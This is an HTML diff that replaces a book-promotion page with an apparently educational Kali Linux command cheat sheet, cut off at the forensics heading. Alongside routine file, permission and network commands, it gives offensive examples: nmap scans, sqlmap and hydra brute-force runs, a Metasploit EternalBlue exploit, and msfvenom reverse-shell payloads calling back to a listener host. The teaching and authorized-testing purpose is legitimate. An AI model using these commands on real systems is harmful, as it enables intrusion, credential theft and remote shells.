-            <strong>Kali Linux A to Z Commands</strong> is a practical reference guide designed for students, cybersecurity enthusiasts, IT professionals, ethical hackers, and penetration testers who want to confidently use Kali Linux from the command line.
+        <h1>Kali Linux <span class="highlight">Commands</span></h1>
+        <p class="subtitle">
+            The complete, hands-on reference to essential Kali Linux commands — from basic file operations 
+            to advanced penetration testing tools. Your daily cheat sheet for ethical hacking.
         </p>
 
-        <!-- ===== TERMINAL POWER BOX ===== -->
-        <div class="terminal-power-box">
-            <p class="big-text">$> master@kali:~#</p>
-            <p style="color:#b0b8c8;">
-                <strong style="color:#00ff88;">800+ Commands</strong> — From A to Z, master the Kali Linux command line!
-            </p>
+        <div class="meta-bar">
+            <div class="meta-item"><span class="ico">📖</span> <span>Reading time: <strong>25 min</strong></span></div>
+            <div class="meta-item"><span class="ico">🐉</span> <span>Category: <strong>Linux</strong></span></div>
+            <div class="meta-item"><span class="ico">🛡️</span> <span>Level: <strong>Beginner → Advanced</strong></span></div>
+            <div class="meta-item"><span class="ico">⚡</span> <span>Updated: <strong>2025</strong></span></div>
         </div>
+    </header>
 
-        <!-- ===== FEATURED IMAGES WITH AMAZON LINK ===== -->
-        <div class="featured-box">
-            <div class="featured-image">
-                <a href="https://www.amazon.com/dp/B0H275TDGT" target="_blank" rel="noopener">
-                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPAcl1xxHlbfZHkQ17ecKK8UkWgtK2mCViNnRn7UzECfJS_mHeVj-2z6KWEylztUF6GCTOBevNf6FT784yMOchQ_xiOAfS0_WZssdx44Cm5YkSo20THgCjQJSz36Ici3Qh66DeaRjtP-nOiz1IvwXr8-69aPm3P-TwP1gVYKMPKoUWQY80I2mq2LZt61oj/s320/kali_linux_commands%20book.png" 
-                         alt="Kali Linux A to Z Commands Book"/>
-                </a>
-                
+    <!-- ===== TABLE OF CONTENTS ===== -->
+    <nav class="toc">
+        <div class="toc-title">📑 Table of Contents</div>
+        <ul class="toc-list">
+            <li><a href="#intro"><span class="num">01</span> Introduction</a></li>
+            <li><a href="#navigation"><span class="num">02</span> Navigation &amp; Files</a></li>
+            <li><a href="#permissions"><span class="num">03</span> Permissions &amp; Users</a></li>
+            <li><a href="#process"><span class="num">04</span> Process Management</a></li>
+            <li><a href="#network"><span class="num">05</span> Network Commands</a></li>
+            <li><a href="#recon"><span class="num">06</span> Recon &amp; Scanning</a></li>
+            <li><a href="#web"><span class="num">07</span> Web Exploitation</a></li>
+            <li><a href="#passwords"><span class="num">08</span> Password Attacks</a></li>
+            <li><a href="#exploitation"><span class="num">09</span> Exploitation</a></li>
+            <li><a href="#forensics"><span class="num">10</span> Forensics &amp; Analysis</a></li>
+            <li><a href="#wireless"><span class="num">11</span> Wireless Attacks</a></li>
+            <li><a href="#misc"><span class="num">12</span> Misc &amp; Utilities</a></li>
+            <li><a href="#apt"><span class="num">13</span> Package Management</a></li>
+            <li><a href="#shortcuts"><span class="num">14</span> Terminal Shortcuts</a></li>
+            <li><a href="#conclusion"><span class="num">15</span> Conclusion</a></li>
+        </ul>
+    </nav>
+
+    <!-- ===== 01 INTRO ===== -->
+    <section class="section" id="intro">
+        <span class="section-number">01 · INTRODUCTION</span>
+        <h2 class="section-title">
+            <span class="icon">🐉</span>
+            What Is Kali Linux?
+        </h2>
+        <p>
+            <strong>Kali Linux</strong> is a Debian-based Linux distribution designed specifically for digital forensics and penetration testing. Maintained by <strong>Offensive Security</strong>, it comes pre-installed with over 600 penetration testing tools — including Nmap, Metasploit, Burp Suite, Wireshark, John the Ripper, and Aircrack-ng. It's the de facto operating system for ethical hackers, red teams, and security researchers worldwide.
+        </p>
+        <p>
+            The power of Kali lies not just in its tools, but in its <strong>command-line interface</strong>. Almost every tool can be invoked, chained, and automated via the terminal. Mastering the essential Kali Linux commands is the foundation of your ethical hacking journey.
+        </p>
+        <div class="callout info">
+            <strong>💡 Note:</strong> All commands in this guide are meant for <em>Kali Linux</em> (Debian-based). They also work on most Debian/Ubuntu systems with minor differences.
+        </div>
+    </section>
+
+    <!-- ===== 02 NAVIGATION ===== -->
+    <section class="section" id="navigation">
+        <span class="section-number">02 · NAVIGATION &amp; FILES</span>
+        <h2 class="section-title">
+            <span class="icon">📁</span>
+            File System Navigation &amp; Manipulation
+        </h2>
+        <p>
+            These are the commands you'll use every single day. Mastering them makes you fast and confident in the terminal.
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📍</span>pwd</div>
+                <p>Print working directory — shows where you currently are in the file system.</p>
             </div>
-            <div class="featured-cta">
-                <p>📚 <strong style="color:#00ff88;">Get Your Copy Today!</strong></p>
-                <a class="main-link" href="https://www.amazon.com/dp/B0H275TDGT" target="_blank" rel="noopener">
-                    🛒 Buy Now on Amazon
-                </a>
-                
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📂</span>ls</div>
+                <p>List directory contents. Use <code>-la</code> for detailed view including hidden files.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🚶</span>cd</div>
+                <p>Change directory. <code>cd ..</code> goes up, <code>cd ~</code> goes to home, <code>cd -</code> goes back.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📄</span>cat</div>
+                <p>Concatenate and display file contents. Perfect for reading config files.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📝</span>nano / vim</div>
+                <p>Text editors. <code>nano</code> is beginner-friendly, <code>vim</code> is powerful but has a learning curve.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📋</span>cp</div>
+                <p>Copy files or directories. Use <code>-r</code> for recursive (directories).</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🗑️</span>mv / rm</div>
+                <p>Move/rename (<code>mv</code>) or delete (<code>rm -rf</code>) files and directories.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔍</span>find</div>
+                <p>Search for files by name, size, permissions, or date. Extremely powerful.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📌</span>locate</div>
+                <p>Quick file search using a pre-built database. Run <code>updatedb</code> first.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📊</span>tree</div>
+                <p>Display directory structure as a visual tree. Great for reconnaissance.</p>
             </div>
         </div>
 
-        <!-- ===== WHAT'S INSIDE ===== -->
+        <h3>Common Examples</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># List all files including hidden, with details</span>
+<span class="cmd">ls</span> -la
+
+<span class="cmt"># Find all .conf files in /etc</span>
+<span class="cmd">find</span> /etc -name <span class="str">"*.conf"</span> 2&gt;/dev/null
+
+<span class="cmt"># Search for files modified in last 24 hours</span>
+<span class="cmd">find</span> / -mtime -1 -type f 2&gt;/dev/null
+
+<span class="cmt"># Copy an entire directory</span>
+<span class="cmd">cp</span> -r /source/dir /destination/
+
+<span class="cmt"># Create nested directories in one shot</span>
+<span class="cmd">mkdir</span> -p project/{scans,logs,reports}
+
+<span class="cmt"># View file with line numbers</span>
+<span class="cmd">cat</span> -n /etc/passwd</code>
+        </div>
+    </section>
+
+    <!-- ===== 03 PERMISSIONS ===== -->
+    <section class="section" id="permissions">
+        <span class="section-number">03 · PERMISSIONS &amp; USERS</span>
+        <h2 class="section-title">
+            <span class="icon">🔐</span>
+            File Permissions &amp; User Management
+        </h2>
         <p>
-            Whether you're just starting your cybersecurity journey or need a reliable command reference, this book provides clear explanations, practical syntax, and real-world examples that make learning faster and easier.
+            Linux permissions are critical for security. Understanding <code>chmod</code>, <code>chown</code>, and user management is essential for privilege escalation and system administration.
         </p>
-        <p>
-            <strong style="color:#00ff88;">Inside this book, you'll discover:</strong>
-        </p>
-        <ul class="two-col-list">
-            <li>Hundreds of essential Kali Linux commands explained from A to Z</li>
-            <li>File and directory management commands</li>
-            <li>User, group, and permission management</li>
-            <li>Networking and troubleshooting commands</li>
-            <li>Package management with APT and DPKG</li>
-            <li>Process and system administration commands</li>
-            <li>Disk, storage, and filesystem utilities</li>
-            <li>Bash shell productivity tips and shortcuts</li>
-            <li>Text processing with grep, sed, awk, sort, and cut</li>
-            <li>Archiving, compression, and backup commands</li>
-            <li>SSH, SCP, and secure remote administration</li>
-            <li>Practical examples for everyday Linux tasks</li>
-            <li>Frequently used penetration testing utilities included with Kali Linux</li>
-            <li>Time-saving command-line techniques for professionals</li>
+
+        <h3>Permission Basics</h3>
+        <p>Each file has three permission types for three classes:</p>
+        <ul>
+            <li><strong>r (read)</strong> — value 4</li>
+            <li><strong>w (write)</strong> — value 2</li>
+            <li><strong>x (execute)</strong> — value 1</li>
+            <li><strong>Classes:</strong> Owner (u), Group (g), Others (o)</li>
         </ul>
 
-        <!-- ===== BOOK HIGHLIGHT ===== -->
-        <div class="book-highlight">
-            <p class="highlight-title">⭐ From Command Line Beginner to Kali Pro</p>
-            <p style="color:#b0b8c8;">
-                No prior Linux experience required — Start from the basics and build real-world command-line skills!
-            </p>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Octal</th><th>Symbolic</th><th>Meaning</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>755</code></td><td><code>rwxr-xr-x</code></td><td>Owner full, others read/execute</td></tr>
+                    <tr><td><code>644</code></td><td><code>rw-r--r--</code></td><td>Owner read/write, others read</td></tr>
+                    <tr><td><code>700</code></td><td><code>rwx------</code></td><td>Only owner has access</td></tr>
+                    <tr><td><code>777</code></td><td><code>rwxrwxrwx</code></td><td>Everyone full access (dangerous!)</td></tr>
+                    <tr><td><code>600</code></td><td><code>rw-------</code></td><td>Private file (SSH keys)</td></tr>
+                </tbody>
+            </table>
         </div>
 
-        <!-- ===== DESCRIPTION ===== -->
-        <p>
-            This guide focuses on helping you understand how commands work and when to use them. Each topic is presented in a clear, easy-to-follow format so you can quickly find the information you need.
-        </p>
-        <p>
-            Whether you're preparing for cybersecurity certifications, working in a lab environment, or building your Linux skills, this book serves as a dependable desktop reference you'll return to again and again.
-        </p>
-        <p>
-            Start mastering the Kali Linux command line today and build the confidence to work efficiently in one of the world's most popular cybersecurity operating systems.
-        </p>
+        <h3>Permission Commands</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Change file permissions</span>
+<span class="cmd">chmod</span> 755 script.sh
+<span class="cmd">chmod</span> +x script.sh
+<span class="cmd">chmod</span> -R 644 /var/www/html/
 
-        <hr/>
+<span class="cmt"># Change ownership</span>
+<span class="cmd">chown</span> user:group file.txt
+<span class="cmd">chown</span> -R www-data:www-data /var/www/
 
-        <!-- ===== PERFECT FOR ===== -->
-        <h2 id="perfect">🎯 Perfect For</h2>
-        <ul class="three-col-list">
-            <li>Beginners learning Kali Linux</li>
-            <li>Cybersecurity students</li>
-            <li>Ethical hackers</li>
-            <li>Penetration testers</li>
-            <li>Network administrators</li>
-            <li>System administrators</li>
-            <li>IT professionals</li>
-            <li>Linux enthusiasts</li>
-        </ul>
+<span class="cmt"># View permissions</span>
+<span class="cmd">stat</span> file.txt
+<span class="cmd">ls</span> -l file.txt
 
-        <!-- ===== FINAL CTA ===== -->
-        <div class="book-highlight" style="border-color:#ffcc00;background:linear-gradient(135deg,rgba(255,204,0,0.05),rgba(0,255,136,0.05));">
-            <p class="highlight-title" style="color:#ffcc00;">$> Ready to Master Kali Linux?</p>
-            <p style="color:#b0b8c8;font-size:16px;">
-                Master Kali Linux one command at a time — Start your journey today!
-            </p>
-            <br/>
-            <a class="main-link" href="https://www.amazon.com/dp/B0H275TDGT" target="_blank" rel="noopener" 
-               style="display:inline-block;padding:15px 42px;background:linear-gradient(135deg,#ffcc00,#ff9900);color:#000000 !important;border-radius:10px;font-weight:700;font-size:16px;text-decoration:none;transition:all 0.3s ease;letter-spacing:0.5px;">
-                🛒 Buy Now on Amazon
-            </a>
-            <p class="small-note" style="color:#6a7290 !important;font-size:13px;margin-top:12px;">
-                Start your Kali Linux journey today — Get your copy now!
-            </p>
+<span class="cmt"># Special permissions</span>
+<span class="cmd">chmod</span> u+s /usr/bin/binary  <span class="cmt"># SUID — runs as owner</span>
+<span class="cmd">chmod</span> g+s /shared/          <span class="cmt"># SGID</span>
+<span class="cmd">chmod</span> +t /tmp/              <span class="cmt"># Sticky bit</span></code>
         </div>
 
-        <hr/>
+        <h3>User Management</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Current user info</span>
+<span class="cmd">whoami</span>
+<span class="cmd">id</span>
+<span class="cmd">who</span>
+<span class="cmd">w</span>
 
-        <!-- ===== SHARE SECTION ===== -->
-        <div class="share-section">
-            <p>📤 Share this book recommendation with your network</p>
-            <div class="share-buttons">
-                <a href="#" onclick="window.open('https://twitter.com/intent/tweet?text=Kali%20Linux%20A%20to%20Z%20Commands%20-%20Master%20Kali%20Linux%20one%20command%20at%20a%20time!%20%23KaliLinux%20%23CyberSecurity%20%23EthicalHacking%20%23Linux','_blank');return false;">
-                    🐦 Twitter
-                </a>
-                <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    📘 Facebook
-                </a>
-                <a href="#" onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    💼 LinkedIn
-                </a>
+<span class="cmt"># Switch user</span>
+<span class="cmd">su</span> - username
+<span class="cmd">sudo</span> -i                <span class="cmt"># root shell</span>
+
+<span class="cmt"># Add / modify users</span>
+<span class="cmd">useradd</span> -m hacker
+<span class="cmd">passwd</span> hacker
+<span class="cmd">usermod</span> -aG sudo hacker
+
+<span class="cmt"># Delete user</span>
+<span class="cmd">userdel</span> -r hacker
+
+<span class="cmt"># View users</span>
+<span class="cmd">cat</span> /etc/passwd
+<span class="cmd">cut</span> -d: -f1 /etc/passwd</code>
+        </div>
+
+        <div class="callout warn">
+            <strong>⚠️ Warning:</strong> Commands like <code>chmod 777</code>, <code>rm -rf</code>, and <code>dd</code> can destroy your system. Always double-check before pressing Enter — especially as root.
+        </div>
+    </section>
+
+    <!-- ===== 04 PROCESS ===== -->
+    <section class="section" id="process">
+        <span class="section-number">04 · PROCESS MANAGEMENT</span>
+        <h2 class="section-title">
+            <span class="icon">⚙️</span>
+            Process Management &amp; Monitoring
+        </h2>
+        <p>
+            Knowing how to inspect and control processes is crucial — both for system administration and for post-exploitation (identifying what services are running).
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📊</span>ps</div>
+                <p>Show running processes. <code>ps aux</code> displays all processes with details.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📈</span>top / htop</div>
+                <p>Real-time process monitor. <code>htop</code> is a prettier, more interactive version.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔪</span>kill</div>
+                <p>Terminate a process by PID. <code>kill -9 PID</code> forces termination.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔍</span>pgrep / pkill</div>
+                <p>Find/kill processes by name instead of PID. Easier than <code>ps | grep</code>.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📋</span>jobs / bg / fg</div>
+                <p>Manage background and foreground jobs in the current shell.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">⏱️</span>nohup</div>
+                <p>Run a command immune to hangups — survives terminal close. Great for long scans.</p>
             </div>
         </div>
 
-    </div>
+        <h3>Examples</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Show all processes</span>
+<span class="cmd">ps</span> aux
+
+<span class="cmt"># Find a specific process</span>
+<span class="cmd">ps</span> aux | <span class="cmd">grep</span> apache
+
+<span class="cmt"># Kill by name</span>
+<span class="cmd">pkill</span> -f <span class="str">"python script.py"</span>
+
+<span class="cmt"># Run scan in background, immune to hangup</span>
+<span class="cmd">nohup</span> nmap -sV 192.168.1.1 &gt; scan.log 2&gt;&amp;1 &amp;
+
+<span class="cmt"># Show what's listening on ports</span>
+<span class="cmd">sudo</span> lsof -i -P -n | <span class="cmd">grep</span> LISTEN
+
+<span class="cmt"># Kill all processes by user</span>
+<span class="cmd">pkill</span> -u username</code>
+        </div>
+    </section>
+
+    <!-- ===== 05 NETWORK ===== -->
+    <section class="section" id="network">
+        <span class="section-number">05 · NETWORK COMMANDS</span>
+        <h2 class="section-title">
+            <span class="icon">🌐</span>
+            Network Configuration &amp; Diagnostics
+        </h2>
+        <p>
+            Network commands are the lifeblood of penetration testing. You'll use these constantly for reconnaissance, pivoting, and troubleshooting.
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📡</span>ifconfig / ip</div>
+                <p>Show/configure network interfaces. <code>ip a</code> is the modern replacement.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔗</span>ping</div>
+                <p>Test connectivity to a host using ICMP echo requests.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🚪</span>netstat / ss</div>
+                <p>Show network connections, routing tables, and listening ports.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔎</span>dig / nslookup</div>
+                <p>DNS lookup tools. <code>dig</code> is more powerful for reconnaissance.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🛣️</span>traceroute</div>
+                <p>Trace the path packets take to a destination host.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔧</span>arp</div>
+                <p>View/manipulate the ARP cache — useful for local network discovery.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📥</span>curl / wget</div>
+                <p>Download files or interact with web services from the command line.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔌</span>nc (netcat)</div>
+                <p>The "Swiss Army knife" of networking — for shells, file transfer, and ports.</p>
+            </div>
+        </div>
+
+        <h3>Essential Examples</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Show all network interfaces</span>
+<span class="cmd">ip</span> a
+<span class="cmd">ifconfig</span>
+
+<span class="cmt"># Show listening ports</span>
+<span class="cmd">sudo</span> ss -tulnp
+
+<span class="cmt"># DNS lookup</span>
+<span class="cmd">dig</span> example.com ANY
+<span class="cmd">dig</span> +short example.com
+<span class="cmd">nslookup</span> example.com 8.8.8.8
+
+<span class="cmt"># Ping sweep a subnet</span>
+<span class="kw">for</span> i <span class="kw">in</span> {1..254}; <span class="kw">do</span> <span class="cmd">ping</span> -c 1 -W 1 192.168.1.$i &gt;/dev/null &amp;&amp; <span class="cmd">echo</span> <span class="str">"192.168.1.$i UP"</span>; <span class="kw">done</span>
+
+<span class="cmt"># Download a file</span>
+<span class="cmd">wget</span> https://example.com/file.zip
+<span class="cmd">curl</span> -O https://example.com/file.zip
+
+<span class="cmt"># Netcat listener (catch reverse shell)</span>
+<span class="cmd">nc</span> -lvnp 4444</code>
+        </div>
+    </section>
+
+    <!-- ===== 06 RECON ===== -->
+    <section class="section" id="recon">
+        <span class="section-number">06 · RECON &amp; SCANNING</span>
+        <h2 class="section-title">
+            <span class="icon">🔎</span>
+            Reconnaissance &amp; Scanning Tools
+        </h2>
+        <p>
+            Reconnaissance is the first phase of any penetration test. These Kali tools help you map out targets, discover hosts, and identify services.
+        </p>
+
+        <h3>Nmap — The Network Mapper</h3>
+        <p>The most important scanning tool in any hacker's toolkit.</p>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Basic ping scan (host discovery)</span>
+<span class="cmd">nmap</span> -sn 192.168.1.0/24
+
+<span class="cmt"># Quick port scan (top 100 ports)</span>
+<span class="cmd">nmap</span> -F 192.168.1.1
+
+<span class="cmt"># Full TCP port scan</span>
+<span class="cmd">nmap</span> -p- 192.168.1.1
+
+<span class="cmt"># Service & version detection</span>
+<span class="cmd">nmap</span> -sV -sC 192.168.1.1
+
+<span class="cmt"># Aggressive scan (OS, version, scripts, traceroute)</span>
+<span class="cmd">nmap</span> -A 192.168.1.1
+
+<span class="cmt"># UDP scan</span>
+<span class="cmd">sudo</span> nmap -sU --top-ports 50 192.168.1.1
+
+<span class="cmt"># Save output in all formats</span>
+<span class="cmd">nmap</span> -sV -oA scan_results 192.168.1.1</code>
+        </div>
+
+        <h3>Other Recon Tools</h3>
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔍</span>whois</div>
+                <p>Query domain registration info — owner, registrar, nameservers.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🌐</span>dnsrecon</div>
+                <p>DNS enumeration — find subdomains, MX records, zone transfers.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📡</span>theHarvester</div>
+                <p>Gather emails, subdomains, hosts from public sources.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔗</span>enum4linux</div>
+                <p>Enumerate Windows/Samba shares, users, and groups.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🌍</span>amass</div>
+                <p>OWASP tool for in-depth attack surface mapping and asset discovery.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🚪</span>masscan</div>
+                <p>Ultra-fast port scanner — can scan the entire internet in minutes.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># WHOIS lookup</span>
+<span class="cmd">whois</span> example.com
+
+<span class="cmt"># DNS enumeration</span>
+<span class="cmd">dnsrecon</span> -d example.com -t std
+
+<span class="cmt"># Email and subdomain harvest</span>
+<span class="cmd">theHarvester</span> -d example.com -b google -l 500
+
+<span class="cmt"># SMB enumeration</span>
+<span class="cmd">enum4linux</span> -a 192.168.1.1
+
+<span class="cmt"># Subdomain enumeration with amass</span>
+<span class="cmd">amass</span> enum -d example.com -o subs.txt</code>
+        </div>
+    </section>
+
+    <!-- ===== 07 WEB ===== -->
+    <section class="section" id="web">
+        <span class="section-number">07 · WEB EXPLOITATION</span>
+        <h2 class="section-title">
+            <span class="icon">🕸️</span>
+            Web Application Testing
+        </h2>
+        <p>
+            Web apps are the most common attack surface today. These Kali tools help you find directories, exploit SQL injection, and intercept HTTP traffic.
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🗂️</span>gobuster</div>
+                <p>Fast directory/file brute-forcer written in Go. Uses wordlists.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🕷️</span>dirb</div>
+                <p>Classic web content scanner. Slower than gobuster but reliable.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🦈</span>nikto</div>
+                <p>Web server scanner — finds dangerous files, misconfigs, outdated software.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">💉</span>sqlmap</div>
+                <p>Automatic SQL injection detection and exploitation.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🕵️</span>wpscan</div>
+                <p>WordPress vulnerability scanner — plugins, themes, users.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔒</span>burpsuite</div>
+                <p>Web proxy for intercepting and modifying HTTP/S traffic.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Directory brute-force with gobuster</span>
+<span class="cmd">gobuster</span> dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+<span class="cmt"># DNS subdomain brute-force</span>
+<span class="cmd">gobuster</span> dns -d target.com -w /usr/share/wordlists/subdomains.txt
+
+<span class="cmt"># Directory scan with dirb</span>
+<span class="cmd">dirb</span> http://target.com /usr/share/wordlists/dirb/big.txt
+
+<span class="cmt"># Nikto web server scan</span>
+<span class="cmd">nikto</span> -h http://target.com
+
+<span class="cmt"># SQL injection test</span>
+<span class="cmd">sqlmap</span> -u <span class="str">"http://target.com/page.php?id=1"</span> --batch --dbs
+
+<span class="cmt"># WordPress scan</span>
+<span class="cmd">wpscan</span> --url http://target.com --enumerate u,vp</code>
+        </div>
+    </section>
+
+    <!-- ===== 08 PASSWORDS ===== -->
+    <section class="section" id="passwords">
+        <span class="section-number">08 · PASSWORD ATTACKS</span>
+        <h2 class="section-title">
+            <span class="icon">🔑</span>
+            Password Cracking &amp; Brute-Force
+        </h2>
+        <p>
+            Password attacks are a core skill for penetration testers. These tools help you crack hashes, brute-force logins, and test password policies.
+        </p>
+
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">💀</span>john</div>
+                <p>John the Ripper — the classic offline password cracker. Supports many hash types.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">⚡</span>hashcat</div>
+                <p>GPU-accelerated password cracker. Faster than John on modern hardware.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🐍</span>hydra</div>
+                <p>Online brute-force tool — supports SSH, FTP, HTTP, RDP, and 50+ protocols.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">📖</span>crunch</div>
+                <p>Generate custom wordlists based on patterns and character sets.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔓</span>medusa</div>
+                <p>Parallel login brute-forcer — similar to Hydra, sometimes faster.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔨</span>cewl</div>
+                <p>Scrape a website to generate a custom wordlist for password guessing.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Crack a hash with John</span>
+<span class="cmd">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+<span class="cmt"># Identify hash type</span>
+<span class="cmd">hash-identifier</span>
+
+<span class="cmt"># Crack with hashcat (NTLM example)</span>
+<span class="cmd">hashcat</span> -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+<span class="cmt"># SSH brute-force with Hydra</span>
+<span class="cmd">hydra</span> -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
+
+<span class="cmt"># HTTP POST form brute-force</span>
+<span class="cmd">hydra</span> -l admin -P pass.txt 192.168.1.1 http-post-form <span class="str">"/login:user=^USER^&amp;pass=^PASS^:F=Invalid"</span>
+
+<span class="cmt"># Generate wordlist with crunch</span>
+<span class="cmd">crunch</span> 8 8 abc123 -o wordlist.txt
+
+<span class="cmt"># Build wordlist from a website</span>
+<span class="cmd">cewl</span> http://target.com -w wordlist.txt</code>
+        </div>
+
+        <div class="callout warn">
+            <strong>⚠️ Legal Warning:</strong> Password attacks against systems you don't own are <strong>illegal</strong>. Only use these tools on systems with explicit written authorization or in legal lab environments (TryHackMe, HackTheBox, etc.).
+        </div>
+    </section>
+
+    <!-- ===== 09 EXPLOITATION ===== -->
+    <section class="section" id="exploitation">
+        <span class="section-number">09 · EXPLOITATION</span>
+        <h2 class="section-title">
+            <span class="icon">💥</span>
+            Exploitation Frameworks
+        </h2>
+        <p>
+            Once you've found vulnerabilities, exploitation frameworks help you turn them into real access.
+        </p>
+
+        <h3>Metasploit Framework</h3>
+        <p>The world's most-used penetration testing framework. It provides exploits, payloads, encoders, and post-exploitation modules.</p>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Start Metasploit console</span>
+<span class="cmd">msfconsole</span>
+
+<span class="cmt"># Inside msfconsole:</span>
+msf6 &gt; <span class="cmd">search</span> type:exploit platform:windows smb
+msf6 &gt; <span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; <span class="cmd">show</span> options
+msf6 &gt; <span class="cmd">set</span> RHOSTS 192.168.1.1
+msf6 &gt; <span class="cmd">set</span> LHOST 192.168.1.100
+msf6 &gt; <span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 &gt; <span class="cmd">exploit</span>
+
+<span class="cmt"># Generate standalone payload with msfvenom</span>
+<span class="cmd">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+
+<span class="cmt"># Linux reverse shell payload</span>
+<span class="cmd">msfvenom</span> -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf</code>
+        </div>
+
+        <h3>Other Exploitation Tools</h3>
+        <div class="cmd-grid">
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🔧</span>searchsploit</div>
+                <p>Search Exploit-DB offline for known exploits matching software versions.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🐚</span>msfvenom</div>
+                <p>Generate custom payloads for many platforms and formats.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">💣</span>beef</div>
+                <p>Browser Exploitation Framework — hooks browsers and runs client-side attacks.</p>
+            </div>
+            <div class="cmd-card">
+                <div class="cmd-name"><span class="ico">🕸️</span>setoolkit</div>
+                <p>Social Engineering Toolkit — phishing, credential harvesting, payloads.</p>
+            </div>
+        </div>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Search for exploits</span>
+<span class="cmd">searchsploit</span> apache 2.4.49
+
+<span class="cmt"># Copy exploit to current directory</span>
+<span class="cmd">searchsploit</span> -m 50383
+
+<span class="cmt"># Start Social Engineering Toolkit</span>
+<span class="cmd">sudo</span> setoolkit</code>
+        </div>
+    </section>
+
+    <!-- ===== 10 FORENSICS ===== -->
